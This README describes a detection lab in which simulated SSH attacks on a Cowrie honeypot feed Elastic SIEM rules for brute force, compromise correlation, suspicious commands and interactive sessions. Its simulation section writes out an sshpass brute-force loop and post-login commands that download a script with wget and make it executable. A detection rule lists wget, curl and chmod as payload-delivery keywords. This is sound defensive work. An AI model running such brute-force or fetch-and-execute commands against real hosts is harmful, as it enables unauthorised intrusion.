# Elastic-SIEM-Detection-Lab-SSH-Attack-Lifecycle
This project simulates real-world SSH attacks using a Cowrie honeypot and builds detection rules in Elastic SIEM to identify attacker behavior across the full intrusion lifecycle.
The lab focuses on detecting and investigating:

Brute force authentication attempts
Successful account compromise
Post-authentication command execution
Interactive attacker behavior
- Objectives
Simulate realistic attacker activity
Build and tune detection rules
Validate alerts using controlled testing
Develop investigation workflows
- Architecture
Honeypot: Cowrie SSH/Telnet honeypot (VPS)
SIEM: Self-hosted Elastic Stack

Data Flow:

Attacker → Cowrie Honeypot → Elastic Agent → Elasticsearch → Detection Rules
- Attack Simulation

A controlled attack sequence was used to generate consistent and realistic logs.

- Failed Login Attempts
for i in {1..10}; do
  sshpass -p wrongpass ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -p 2222 root@<IP> "exit"
done
- Successful Login
ssh root@<IP> -p 2222
  - Post-Access Activity
ls
pwd
whoami
cd /tmp
wget http://example.com/test.sh
chmod +x test.sh
- Detection Rules
  1. SSH Brute Force Detection

Method: Threshold Rule
Logic: Multiple failed login attempts from a single IP

Field: event.action: cowrie.login.failed
Group by: source.ip
Thresholds:
5 attempts → Low
10 attempts → Medium
25+ attempts → High
  2. Brute Force → Successful Login (Correlation)

Method: Event Correlation (EQL)
Logic: Multiple failed logins followed by a successful login from the same IP

sequence by source.ip with maxspan=2m
  [any where event.action == "cowrie.login.failed"]
  [any where event.action == "cowrie.login.failed"]
  [any where event.action == "cowrie.login.failed"]
  [any where event.action == "cowrie.login.failed"]
  [any where event.action == "cowrie.login.failed"]
  [any where event.action == "cowrie.login.success"]

- This represents a high-confidence compromise event

  3. Suspicious Command Detection

Method: Custom Query Rule
Logic: Detect commands used for payload delivery

event.action: "cowrie.command.input" AND
(cowrie.command: *wget* OR cowrie.command: *curl* OR cowrie.command: *chmod*)

MITRE ATT&CK: T1105 – Ingress Tool Transfer

  4. Interactive Session Detection

Method: Threshold Rule
Logic: Detect human-like exploration behavior

Commands:
ls, pwd, whoami, cat, cd
Threshold:
5 commands within 5 minutes
Group by: source.ip

➡️ Differentiates automated attacks from interactive attackers

🔍 Investigation Workflow

When an alert is triggered:

Identify source.ip from the alert
Pivot in Discover:
source.ip: "X.X.X.X"
Review:
Failed login attempts
Successful authentication
Command execution
Determine:
Was access gained?
What actions were performed?
🔗 Attack Chain (End-to-End Detection)

This lab detects the full attacker lifecycle:

Brute Force → Successful Login → System Exploration → Payload Execution
  -Key Insights
Detection accuracy depends on correct data source alignment
Field normalization (event.action, cowrie.command) improves reliability
Correlation rules reduce false positives and increase confidence
Controlled testing enables repeatable validation
  - Challenges & Solutions
Challenge	Solution
Hydra attacking wrong service	Targeted honeypot port
Cowrie accepting all passwords	Implemented userdb authentication
SSH compatibility issues	Switched to sshpass for testing
Alert noise from correlation	Tuned maxspan and thresholds
  - Lessons Learned
Realistic testing is critical for detection validation
Detection engineering involves iterative tuning, not just rule creation
Correlating multiple events provides stronger security insights than single-event alerts
  - Future Improvements
Expand command detection coverage
Enhance honeypot realism (filesystem, artifacts)
Integrate threat intelligence enrichment
Develop additional anomaly-based detections
- Screenshots



- Summary

This project demonstrates the ability to:

Simulate attacker behavior
Build and tune SIEM detections
Correlate events into meaningful alerts
Investigate and validate security incidents

Represents practical, hands-on experience in detection engineering and SOC operations
